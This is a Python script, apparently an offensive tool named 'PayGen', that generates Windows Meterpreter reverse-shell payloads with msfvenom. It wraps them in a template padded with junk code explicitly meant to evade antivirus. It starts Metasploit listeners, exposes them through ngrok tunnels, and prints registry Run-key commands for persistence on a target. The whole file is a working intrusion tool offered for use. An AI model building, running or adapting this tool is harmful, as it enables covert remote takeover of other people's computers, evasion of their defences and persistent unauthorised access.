import os
import string
import random
import time
import requests
Len = 8
randomtask = ''.join(random.choices(string.ascii_uppercase + string.digits, k=Len))


def Banner():
    os.system("clear")
    print(Green+""" 
 ____   __   _  _  ___  ____  _  _ 
(  _ \ /__\ ( \/ )/ __)( ___)( \( )
 )___//(__)\ \  /( (_-. )__)  )  ( 
(__) (__)(__)(__) \___/(____)(_)\_)
Coded By youhacker55

Don t upload Payload To VirusTotal 
  """)

z = random.randint(40,50)

S = z

ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k=S))


Red ="\u001b[31m"
Green ="\u001b[32m"
def listeners():
    listen = input(Green+"do you want to start multi/handler:")
    if listen == "yes":
        with open("handlers/"+payloadname+".rc","w") as hand:
            hand.write("use multi/handler\n")
            hand.write("set payload windows/meterpreter/reverse_"+prot+"\n")
            hand.write("set lhost "+lhost+"\n")
            hand.write("set lport "+lport+"\n")
            hand.write("exploit")
            hand.close()
            os.system("sudo msfconsole -r handlers/"+payloadname+".rc")
def ngrokhandler(nglport,prot):
    with open("handlers/ngrok.rc", "w") as hand:
        hand.write("use multi/handler\n")
        hand.write("set payload windows/meterpreter/reverse_" + prot + "\n")
        hand.write("set lhost 0.0.0.0 \n")
        hand.write("set lport " + nglport + "\n")
        hand.write("exploit")
        hand.close()



def inplace_change(filename, old_string, new_string):
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return

    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)

Banner()
print(Red+"""
1)Generate Payload
2)AutoPortForwarding(Ngrok)
3)Help Me With Persistence
""")
choose = int(input("root@Gen:"))

if choose == 1:
    lhost = input(Green+"entre Lhost:")
    lport = input(Green+"entre Lport:")
    prot=input(Green+"Payload_Type(tcp,https):")
    payloadname = input(Green + "entre PayloadName:")
    os.system("msfvenom -p windows/meterpreter/reverse_" + prot + "  LHOST=" + lhost + " LPORT=" + lport + " SessionExpirationTimeout=0 SessionCommunicationTimeout=0 exitfunc=process  -f psh-cmd -o payload.bat >/dev/null 2>&1")
    print(Green + "[*]Generating Payload")
    inplace_change("payload.bat", "%COMSPEC%", "cmd.exe")
    with open("payload.bat") as reverseshell:
        thepay = reverseshell.read()
    os.system("cp -r template/payload.py  payloads/")
    os.system("cd payloads/ && mv payload.py " + payloadname + ".py")
    inplace_change("payloads/" + payloadname + ".py", "changeme", thepay)
    inplace_change("payloads/" + payloadname + ".py", "RANDROMSTRING", ran)
    print("Adding Some Junk Code To Evade AV :)")
    os.remove("payload.bat")
    print("Payload Saved in payloads/")
    time.sleep(5)
    listeners()
elif choose == 2:

    try:
        prot = input(Green + "Payload_Type(tcp,https):")
        payloadname = input(Green + "entre PayloadName:")
        port = input("entre ngrok localport:")
        ngrokhandler(port,prot)
        os.system("xterm -fg green -bg black -e ngrok tcp " + port + " & ")
        time.sleep(5)

        url = "http://127.0.0.1:4040/api/tunnels"
        recived = requests.get(url)
        tcp = recived.json()["tunnels"][0]["public_url"]
        ngrokhost = (tcp[6:20])
        ngrokport = (tcp[21:])
        os.system("msfvenom -p windows/meterpreter/reverse_" + prot + "  LHOST=" + ngrokhost + " LPORT=" + ngrokport + " SessionExpirationTimeout=0 SessionCommunicationTimeout=0 exitfunc=process  -f psh-cmd -o payload.bat >/dev/null 2>&1")
        print(Green + "[*]Generating Payload")
        inplace_change("payload.bat", "%COMSPEC%", "cmd.exe")
        with open("payload.bat") as reverseshell:
            thepay = reverseshell.read()
        os.system("cp -r template/payload.py  payloads/")
        os.system("cd payloads/ && mv payload.py " + payloadname + ".py")
        inplace_change("payloads/" + payloadname + ".py", "changeme", thepay)
        inplace_change("payloads/" + payloadname + ".py", "RANDROMSTRING", ran)
        print("Adding Some Junk Code To Evade AV :)")
        os.remove("payload.bat")
        print("Payload Saved in payloads/")
        time.sleep(5)
        multhandler = input("do you want to start multi/handler:")
        if multhandler == "yes":
            os.system("sudo msfconsole -r handlers/ngrok.rc")
        else:
            exit()



    except requests.ConnectionError:
        print("Check Ngrok Authtoken")
        exit()





elif choose == 3:
    admin = input("Do you Have Admin Priv:")
    if admin == "yes":
        task = input("entre the taskName (Entre For Random 1):")
        if task == "":
            path = input("Entre Payload Path on The Target Sys:")
            command = 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "' + randomtask + '" /t REG_SZ /F /D "' + path + '"'
            print(Green+" Type this on Target Shell ==> ",Red+command+'\n')
        else:
            path = input("Entre Payload Path on The Target Sys:")
            command = 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "' + task + '" /t REG_SZ /F /D "' + path + '"'
            print(Green+" Type this on Target Shell ==> ",Red+ command)
    else:
        task = input("entre the taskName (Entre For Random 1):")
        if task == "":
            path = input("Entre Payload Path on The Target Sys:")
            command = 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "'+randomtask +'" /t REG_SZ /F /D "'+path+'"'
            print(Green + " Type this on Target Shell ==> ", Red + command + '\n')
        else:
            path = input("Entre Payload Path on The Target Sys:")
            command = 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "' +task+ '" /t REG_SZ /F /D "' + path + '"'
            print(Green + " Type this on Target Shell ==> ", Red + command + '\n')








